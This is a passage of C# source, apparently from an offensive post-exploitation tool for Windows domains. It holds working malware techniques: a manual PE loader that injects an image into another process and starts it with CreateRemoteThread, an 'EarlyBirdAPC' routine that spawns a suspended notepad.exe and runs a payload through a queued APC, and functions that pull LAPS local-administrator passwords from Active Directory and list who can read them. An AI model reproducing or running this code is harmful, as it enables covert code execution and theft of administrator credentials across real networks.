                if (bit != "64bit")
                {
                    Environment.Exit(0);
                }



                int headerssize = GetSizeofHeaders(rawfile);

                int imagesize = GetImageSize(rawfile);

                IntPtr baseaddress = VirtualAlloc(IntPtr.Zero, imagesize, 0x00001000, 0x40);
                Marshal.Copy(rawfile, 0, baseaddress, headerssize);

                IntPtr remotebaseaddress = VirtualAllocEx(prochandle, IntPtr.Zero, (uint)imagesize, 0x00001000, 0x40);

                uint oldprotect = 0;
                VirtualProtectEx(prochandle, remotebaseaddress, (uint)imagesize, 0x40, ref oldprotect);

                Console.WriteLine("Local base address: {0}", baseaddress.ToString("X"));
                Console.WriteLine("Memory allocated at: {0}", remotebaseaddress.ToString("X2"));
                Console.WriteLine("Imagesize: {0}", imagesize.ToString("X"));


                #region parsing headers

                IMAGE_DOS_HEADER dosheader = (IMAGE_DOS_HEADER)Marshal.PtrToStructure(baseaddress, typeof(IMAGE_DOS_HEADER));

                IMAGE_NT_HEADERS64 ntheader = new IMAGE_NT_HEADERS64();

                ntheader.Signature = (uint)Marshal.ReadInt32(baseaddress + dosheader.e_lfanew);

                ntheader.FileHeader = (IMAGE_FILE_HEADER)Marshal.PtrToStructure(baseaddress + dosheader.e_lfanew + 4, typeof(IMAGE_FILE_HEADER));

                ntheader.OptionalHeader = (IMAGE_OPTIONAL_HEADER64)Marshal.PtrToStructure(baseaddress + dosheader.e_lfanew + 24, typeof(IMAGE_OPTIONAL_HEADER64));

                Console.WriteLine(ntheader.OptionalHeader.ImageBase.ToString("X2"));
                Console.WriteLine(ntheader.OptionalHeader.AddressOfEntryPoint.ToString("X2"));

                IMAGE_SECTION_HEADER[] sh = new IMAGE_SECTION_HEADER[ntheader.FileHeader.NumberOfSections];

                for (int i = 0; i < ntheader.FileHeader.NumberOfSections; i++)
                {

                    sh[i] = (IMAGE_SECTION_HEADER)Marshal.PtrToStructure((baseaddress + dosheader.e_lfanew + 24 + Marshal.SizeOf(ntheader.OptionalHeader)) + (i * Marshal.SizeOf(typeof(IMAGE_SECTION_HEADER))), typeof(IMAGE_SECTION_HEADER));
                    Console.WriteLine("Name: {0}", new string(sh[i].Name));
                    Console.WriteLine("Virtual Address: {0}", sh[i].VirtualAddress.ToString("X"));
                    Console.WriteLine("Raw offset: {0}", sh[i].PointerToRawData.ToString("X"));
                    Console.WriteLine("Size of raw data: {0}", sh[i].SizeOfRawData.ToString("X"));
                    Console.WriteLine("Virtual Size: {0}", sh[i].VirtualSize.ToString("X"));
                }


                #endregion

                byte[] headers = new byte[headerssize];
                Marshal.Copy(baseaddress, headers, 0, headers.Length);

                uint byteswritten = 0;
                WriteProcessMemory(prochandle, remotebaseaddress, headers, headers.Length, ref byteswritten);

                Console.WriteLine("Headers size written: {0}", byteswritten.ToString("X"));


                //mapping sections into remote memory

                for (int i = 0; i < sh.Length; i++)
                {
                    if (sh[i].SizeOfRawData > 0)
                    {
                        uint rawoffset = sh[i].PointerToRawData;
                        Console.WriteLine(rawoffset.ToString("X"));
                        byte[] temp = new byte[sh[i].VirtualSize];

                        for (int j = 0; j < temp.Length; j++)
                        {
                            temp[j] = rawfile[j + sh[i].PointerToRawData];
                            //Console.Write(temp[j].ToString("X")+",");
                        }
                        // Console.WriteLine((baseaddress + (int)sh[i].VirtualAddress).ToString("X"));
                        byteswritten = 0;
                        WriteProcessMemory(prochandle, remotebaseaddress + (int)sh[i].VirtualAddress, temp, temp.Length, ref byteswritten);
                        Console.WriteLine("section {0} with size {1} written", new string(sh[i].Name), byteswritten.ToString("X"));
                    }
                }

                List<IntPtr> handles = new List<IntPtr>();

                #region Fixing IATs
                //Console.WriteLine("import directory size: {0}", ntheader.OptionalHeader.ImportTable.Size);
                // fix IAT's only if import directory is not zero
                if (ntheader.OptionalHeader.ImportTable.Size > 0)
                {
                    IntPtr importptr = (IntPtr)baseaddress + (int)ntheader.OptionalHeader.ImportTable.VirtualAddress;



                    IMAGE_IMPORT_DESCRIPTOR firstimport = (IMAGE_IMPORT_DESCRIPTOR)Marshal.PtrToStructure(importptr, typeof(IMAGE_IMPORT_DESCRIPTOR));

                    while (firstimport.Name != 0)
                    {

                        string dllname = Marshal.PtrToStringAnsi(baseaddress + (int)firstimport.Name);
                        Console.WriteLine("Dll name: {0}", dllname);

                        IntPtr dllhandle = LoadLibrary(dllname);



                        Console.WriteLine(GetLastError());
                        int errorcode = GetLastError();

                        IntPtr originalfirstthunk = baseaddress + (int)firstimport.OriginalFirstThunk;

                        IntPtr firstthunkptr = baseaddress + (int)firstimport.FirstThunk;

                        IntPtr remotefirstthunk = remotebaseaddress + (int)firstimport.FirstThunk;

                        //IMAGE_THUNK_DATA64 firstthunk = (IMAGE_THUNK_DATA64)Marshal.PtrToStructure(firstthunkptr, typeof(IMAGE_THUNK_DATA64));
                        IMAGE_THUNK_DATA64 thunk1 = (IMAGE_THUNK_DATA64)Marshal.PtrToStructure(originalfirstthunk, typeof(IMAGE_THUNK_DATA64));

                        while (thunk1.Function != 0)
                        {
                            IntPtr name1 = baseaddress + (int)thunk1.Function;

                            string functionname = Marshal.PtrToStringAnsi(name1 + 2);
                            Console.WriteLine(functionname);

                            if (errorcode == 0)
                            {
                                IntPtr functionaddress = GetProcAddress(dllhandle, functionname);
                                if (GetLastError() == 0)
                                {
                                    handles.Add(dllhandle);
                                    Console.WriteLine("Function address: {0}", functionaddress.ToString("X"));

                                    Marshal.WriteInt64(firstthunkptr, functionaddress.ToInt64());

                                    byteswritten = 0;
                                    byte[] functionvalue = BitConverter.GetBytes(functionaddress.ToInt64());
                                    WriteProcessMemory(prochandle,
                                        remotefirstthunk,
                                        functionvalue,
                                        functionvalue.Length,
                                        ref byteswritten
                                        );

                                }
                            }
                            originalfirstthunk += Marshal.SizeOf(typeof(IMAGE_THUNK_DATA64));
                            thunk1 = (IMAGE_THUNK_DATA64)Marshal.PtrToStructure(originalfirstthunk, typeof(IMAGE_THUNK_DATA64));

                        }
                        firstthunkptr += 4;
                        remotefirstthunk += 4;

                        importptr += Marshal.SizeOf(typeof(IMAGE_IMPORT_DESCRIPTOR));
                        firstimport = (IMAGE_IMPORT_DESCRIPTOR)Marshal.PtrToStructure(importptr, typeof(IMAGE_IMPORT_DESCRIPTOR));

                    }
                }
                #endregion



                #region fixing base relocations

                ulong delta = ((ulong)remotebaseaddress.ToInt64()) - ntheader.OptionalHeader.ImageBase;

                Console.WriteLine("Expected ImageBase: {0}", ntheader.OptionalHeader.ImageBase.ToString("X"));
                Console.WriteLine("Loaded ImageBase: {0}", baseaddress.ToString("X"));
                Console.WriteLine("Delta: {0}", delta.ToString("X"));

                IntPtr firstreloc = baseaddress + (int)ntheader.OptionalHeader.BaseRelocationTable.VirtualAddress;
                uint allrelocsize = ntheader.OptionalHeader.BaseRelocationTable.Size;

                IMAGE_BASE_RELOCATION reloc1 = (IMAGE_BASE_RELOCATION)Marshal.PtrToStructure(firstreloc, typeof(IMAGE_BASE_RELOCATION));

                while (reloc1.pagerva != 0)
                {

                    Console.WriteLine("RVA: {0}", reloc1.pagerva.ToString("X"));
                    Console.WriteLine("size: {0}", reloc1.size.ToString("X"));

                    int entries = ((int)reloc1.size - 8) / 2;

                    Console.WriteLine("Number of entries: {0}", entries.ToString("X"));

                    for (int i = 0; i < entries; i++)
                    {
                        int offset = Marshal.ReadInt16((firstreloc + 8) + (i * 2));
                        offset = (offset & 0xffff);
                        string temp2 = offset.ToString("X");
                        if (temp2[0] == 'A')
                        {
                            // IMAGE_REL_BASED_DIR64 10


                            temp2 = temp2.Remove(0, 1);
                            string offset2 = temp2;

                            Console.WriteLine("Offset: {0}", offset2);

                            byte[] byteoffset2 = Encoding.ASCII.GetBytes(offset2);

                            long temp = Convert.ToInt64(offset2, 16);

                            long fullrva = reloc1.pagerva + temp;
                            Console.WriteLine("Full  RVA: {0}", fullrva.ToString("X"));

                            long value = Marshal.ReadInt64((IntPtr)(baseaddress.ToInt64() + fullrva));
                            Console.WriteLine("TO BE RELOCATED VALUE: {0}", value.ToString("X"));

                            ulong updatedvalue = (ulong)value + delta;
                            Console.WriteLine("updated value: {0}", updatedvalue.ToString("X"));
                            Marshal.WriteInt64((IntPtr)(baseaddress.ToInt64() + fullrva), (long)updatedvalue);

                            byte[] latestvalue = BitConverter.GetBytes(updatedvalue);

                            byteswritten = 0;
                            WriteProcessMemory(prochandle, (IntPtr)(remotebaseaddress.ToInt64() + fullrva), latestvalue, latestvalue.Length, ref byteswritten);
                        }

                    }

                    firstreloc += (int)reloc1.size;
                    reloc1 = (IMAGE_BASE_RELOCATION)Marshal.PtrToStructure(firstreloc, typeof(IMAGE_BASE_RELOCATION));

                }

                #endregion




                uint threadid = 0;
                IntPtr threadhandle = CreateRemoteThread(
                    prochandle,
                    IntPtr.Zero,
                   (uint)ntheader.OptionalHeader.SizeOfStackCommit,
                    remotebaseaddress + (int)ntheader.OptionalHeader.AddressOfEntryPoint,
                    IntPtr.Zero,
                    0,
                    ref threadid
                    );
                Console.WriteLine("last error: {0}", GetLastError());
                Console.WriteLine("Thread ID: {0}", threadid);

                foreach (var i in handles)
                {
                    FreeLibrary(i);
                }

                VirtualFree(baseaddress, 0, 0x00008000);

                //p.Kill();



            }
            catch { }


            // Console.ReadKey();
        }

        public static void EarlyBirdAPC(byte[] payload)
        {

            STARTUPINFO si = new STARTUPINFO();
            PROCESS_INFORMATION pi = new PROCESS_INFORMATION();

            UInt32 CREATE_SUSPENDED = 0x00000004;
            CreateProcessA(
                @"C:\Windows\notepad.exe",
                null,
                IntPtr.Zero,
                IntPtr.Zero,
                false,
                CREATE_SUSPENDED,
                IntPtr.Zero,
                null,
                ref si,
                out pi
                );

            Console.WriteLine(pi.dwProcessId);


            IntPtr baseaddress = VirtualAllocEx(
                pi.hProcess,
                IntPtr.Zero,
                (uint)payload.Length,
                0x00001000 | 0x00002000,
                0x40
                );

            uint byteswritten = 0;
            WriteProcessMemory(pi.hProcess,
                baseaddress,
                payload,
                payload.Length,
                ref byteswritten
                );


            QueueUserAPC(
                baseaddress,
                pi.hThread,
                IntPtr.Zero
                );

            ResumeThread(pi.hThread);


        }


        public static string GetLapsComputers()
        {
            string res = "";
            StringWriter sw = new StringWriter();
            Forest f = Forest.GetCurrentForest();

            DomainCollection d = f.Domains;

            foreach (Domain domain in d)
            {
                // tech69.local
                string domainname = domain.Name.ToString();

                string[] temp = domainname.Split('.');

                for (int i = 0; i < temp.Length; i++)
                {
                    temp[i] = "DC=" + temp[i];
                }

                string domaindn = String.Join(",", temp);


                DirectoryEntry de = new DirectoryEntry("LDAP://" + domaindn);

                DirectorySearcher ds = new DirectorySearcher();
                ds.SearchRoot = de;
                ds.Filter = "(&(objectclass=user)(ms-Mcs-AdmPwdExpirationTime=*))";
                try
                {
                    sw.WriteLine("------ LAPS Protected Computers -----");

                    foreach (SearchResult sr in ds.FindAll())
                    {


                        sw.WriteLine("OU: {0}", sr.Properties["distinguishedname"][0].ToString());
                        sw.WriteLine("Expiration Time: {0}", sr.Properties["ms-Mcs-AdmPwdExpirationTime"][0].ToString());
                        sw.WriteLine("Password: {0}", sr.Properties["ms-Mcs-AdmPwd"][0].ToString());

                    }
                }
                catch (Exception e)
                {
                    res += sw.ToString();
                    res+= e.Message;
                   // return res;
                    // Console.WriteLine(e.Message);
                }

                
            }
            res = sw.ToString();

            return res;
        }


        public static string GetLapsDelegatedUsers()
        {
            string res = "";
            StringWriter sw = new StringWriter();
            Forest f = Forest.GetCurrentForest();

            DomainCollection d = f.Domains;

            foreach (Domain domain in d)
            {
                // tech69.local
                string domainname = domain.Name.ToString();

                string[] temp = domainname.Split('.');

                for (int i = 0; i < temp.Length; i++)
                {
                    temp[i] = "DC=" + temp[i];
                }

                string domaindn = String.Join(",", temp);


                DirectoryEntry de = new DirectoryEntry("LDAP://" + domaindn);

                DirectorySearcher ds = new DirectorySearcher();
                ds.SearchRoot = de;
                ds.Filter = "(&(objectclass=user)(ms-Mcs-AdmPwdExpirationTime=*))";
                try
                {
                    sw.WriteLine("------ LAPS Delegation Groups -----");

                    foreach (SearchResult sr in ds.FindAll())
                    {

                        DirectoryEntry dentry = sr.GetDirectoryEntry();
                        ActiveDirectorySecurity ads = dentry.ObjectSecurity;

                        AuthorizationRuleCollection arc = ads.GetAccessRules(true, true, typeof(NTAccount));

                        sw.WriteLine(sr.Properties["distinguishedname"][0].ToString());

                        foreach (ActiveDirectoryAccessRule ar in arc)
                        {

                            if (ar.ActiveDirectoryRights.ToString().ToLower().Contains("extendedright") || ar.ActiveDirectoryRights.ToString().ToLower().Contains("read"))
                            {
                                if (!ar.IdentityReference.Value.ToLower().Contains("admin") || !ar.IdentityReference.Value.ToLower().Contains("domain controllers"))
                                {

                                    //  Console.WriteLine(ar.AccessControlType);
                                    sw.Write("Object: {0}, ", ar.IdentityReference);
                                    sw.WriteLine("Permissions: {0}", ar.ActiveDirectoryRights);
                                    //  Console.WriteLine(ar.ObjectFlags);
                                    //  Console.WriteLine(ar.ObjectType);
                                }
                            }
                        }
                        sw.WriteLine();

                    }
                }
                catch (Exception e)
                {
                    // Console.WriteLine(e.Message);
                }
            }

            res = sw.ToString();
            return res;

        }



    }
}
